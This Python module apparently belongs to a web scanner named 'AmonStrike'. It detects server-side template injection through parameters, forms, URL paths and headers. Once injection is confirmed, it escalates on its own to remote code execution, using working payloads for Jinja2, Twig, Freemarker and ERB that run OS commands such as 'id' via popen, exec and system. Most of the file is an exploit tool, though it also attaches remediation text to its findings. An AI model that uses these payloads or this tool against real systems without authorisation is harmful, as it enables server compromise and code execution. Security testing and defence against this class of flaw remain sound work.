"""
AmonStrike — Server-Side Template Injection (SSTI) Module
One of the most impactful vulnerabilities in modern web apps.
Often leads to RCE through template engine exploitation.

Affected engines:
  Jinja2 (Python/Flask)       — {{7*7}} → 49
  Twig (PHP)                  — {{7*7}} → 49
  Freemarker (Java)           — ${7*7} → 49
  Velocity (Java)             — #set($x=7*7)${x}
  Smarty (PHP)                — {7*7} → 49 (or {math})
  Handlebars (Node.js)        — {{#with "s" as |str|}}
  ERB (Ruby)                  — <%= 7*7 %>
  Pebble (Java)               — {{7*7}}
  Mako (Python)               — ${7*7}
"""

import re
from .base import BaseModule


class SstiModule(BaseModule):
    NAME        = "ssti"
    DESCRIPTION = "Server-Side Template Injection — Jinja2, Twig, Freemarker, ERB"

    # Detection payloads — math that only evaluates in template context
    DETECTION_PAYLOADS = [
        # Generic — works in many engines
        ("{{7*7}}",          "49",   "Generic (Jinja2/Twig/Pebble)"),
        ("${7*7}",           "49",   "Generic (Freemarker/EL)"),
        ("<%=7*7%>",         "49",   "ERB (Ruby)"),
        ("#{7*7}",           "49",   "Ruby string interpolation"),
        ("{7*7}",            "49",   "Smarty/generic"),
        ("${{7*7}}",         "49",   "Spring EL"),
        ("{{7*'7'}}",        "7777777", "Jinja2 specific"),
        ("@(7*7)",           "49",   "Razor (.NET)"),
        ("*{7*7}",           "49",   "Spring EL (alternate)"),
    ]

    # RCE payloads for confirmed SSTI — used to escalate
    RCE_PAYLOADS = {
        "Jinja2": [
            "{{config.items()}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ],
        "Twig": [
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        ],
        "Freemarker": [
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
        ],
        "ERB": [
            "<%= `id` %>",
            "<%= system('id') %>",
        ],
    }

    def run(self):
        self.log("Testing for Server-Side Template Injection (SSTI)...")

        # Find injectable parameters
        params = self._find_injectable_params()
        self.info["params_tested"] = len(params)

        for url, param in params:
            self._test_ssti(url, param)

        # Test in path segments
        self._test_ssti_in_path()

        # Test in headers
        self._test_ssti_in_headers()

        self.log(f"SSTI scan complete — {len(self.findings)} findings", "+")
        return self.result()

    def _find_injectable_params(self) -> list:
        """Find URL parameters and form fields to test."""
        params = []

        resp = self.get()
        if not resp:
            return params

        # Parse URL params
        from urllib.parse import urlparse, parse_qs
        parsed   = urlparse(self.url)
        qs       = parse_qs(parsed.query)
        for param in qs:
            params.append((self.url, param))

        # Parse forms
        try:
            from bs4 import BeautifulSoup
            soup  = BeautifulSoup(resp.text, "html.parser")
            forms = soup.find_all("form")
            for form in forms:
                action = form.get("action","") or ""
                base   = self.url + action if action.startswith("/") else self.url
                for inp in form.find_all("input"):
                    name = inp.get("name","")
                    if name and inp.get("type","text") not in ["submit","hidden","file"]:
                        params.append((base, name))
        except Exception:
            pass

        # Common params to test
        common = ["name","search","q","query","template","lang",
                  "view","page","file","include","msg","message"]
        for p in common:
            params.append((self.url, p))

        return params[:20]  # Limit

    def _test_ssti(self, url: str, param: str):
        """Test a parameter for SSTI."""
        for payload, expected, engine_hint in self.DETECTION_PAYLOADS:
            resp = self.get(
                url.replace(self.url,""),
                params={param: payload}
            )
            if not resp:
                continue

            if expected in resp.text:
                # Confirmed SSTI — determine engine and escalate
                engine = self._identify_engine(resp.text, payload, expected)

                self.add_finding(
                    title=f"Server-Side Template Injection (SSTI) — {engine}",
                    severity="CRITICAL",
                    description=f"SSTI detected in parameter '{param}'. Template engine {engine} evaluated '{payload}' → '{expected}'. This typically leads to Remote Code Execution.",
                    evidence=f"URL: {url}\nParameter: {param}\nPayload: {payload}\nExpected: {expected}\nFound in response\nEngine: {engine}",
                    remediation="Never pass user input directly to template engines. Use template literals or sandboxing. Upgrade to engine version with sandboxing enabled.",
                    url=url,
                    cve="CWE-94"
                )

                # Attempt RCE escalation
                self._escalate_ssti(url, param, engine)
                return  # Found on this param — move on

    def _identify_engine(self, response: str, payload: str, expected: str) -> str:
        """Try to identify the template engine."""
        # Jinja2 specific
        if "{{7*'7'}}" in payload and "7777777" in response:
            return "Jinja2 (Python)"
        if "{{config.items()}}" in response:
            return "Jinja2 (Python)"

        # ERB specific
        if "<%=" in payload:
            return "ERB (Ruby)"

        # Freemarker specific
        if "${" in payload and "freemarker" in response.lower():
            return "Freemarker (Java)"

        # Generic detection
        if "49" in response and "{{7*7}}" in payload:
            return "Jinja2/Twig/Generic"

        return "Unknown Template Engine"

    def _escalate_ssti(self, url: str, param: str, engine: str):
        """Try to escalate SSTI to RCE."""
        engine_key = "Jinja2" if "jinja" in engine.lower() else \
                     "Twig"   if "twig"  in engine.lower() else \
                     "ERB"    if "erb"   in engine.lower() else \
                     "Freemarker" if "freemarker" in engine.lower() else None

        if not engine_key:
            return

        for payload in self.RCE_PAYLOADS.get(engine_key,[])[:2]:
            resp = self.get(url.replace(self.url,""), params={param: payload})
            if not resp:
                continue

            # Check for RCE indicators
            rce_indicators = ["uid=","root","daemon","www-data",
                              "total 0","bin/sh","/etc/"]
            if any(ind in resp.text for ind in rce_indicators):
                self.add_finding(
                    title=f"SSTI → Remote Code Execution Confirmed ({engine})",
                    severity="CRITICAL",
                    description=f"SSTI escalated to RCE. OS commands are executing on the server.",
                    evidence=f"RCE payload: {payload}\nResponse: {resp.text[:300]}",
                    remediation="CRITICAL: Disable template engine or implement strict sandboxing immediately. Remove user input from all template contexts.",
                    url=url,
                    cve="CWE-94"
                )
                return

    def _test_ssti_in_path(self):
        """Test SSTI in URL path segments."""
        test_paths = [
            f"/{{{{7*7}}}}",
            f"/${{7*7}}",
            f"/{{% 7*7 %}}",
        ]
        for path in test_paths:
            resp = self.get(path)
            if resp and "49" in resp.text:
                self.add_finding(
                    title="SSTI in URL Path",
                    severity="CRITICAL",
                    description="Template injection found in URL path — server evaluates template expressions in URL routing.",
                    evidence=f"Path: {path}\nResponse contains: 49",
                    remediation="Sanitize URL path components before passing to template engine.",
                    url=self.url + path,
                    cve="CWE-94"
                )

    def _test_ssti_in_headers(self):
        """Test SSTI in HTTP headers (User-Agent, Referer, X-Forwarded-For)."""
        ssti_headers = {
            "User-Agent":  "{{7*7}}",
            "Referer":     "${7*7}",
            "X-Forwarded-Host": "{{7*7}}",
        }
        for header, payload in ssti_headers.items():
            resp = self.get(headers={header: payload})
            if resp and "49" in resp.text:
                self.add_finding(
                    title=f"SSTI via HTTP Header: {header}",
                    severity="HIGH",
                    description=f"Template injection via {header} header. Server evaluates template expressions from HTTP headers.",
                    evidence=f"Header: {header}: {payload}\nResponse contains: 49",
                    remediation="Sanitize all HTTP header values before using in templates.",
                    url=self.url,
                    cve="CWE-94"
                )
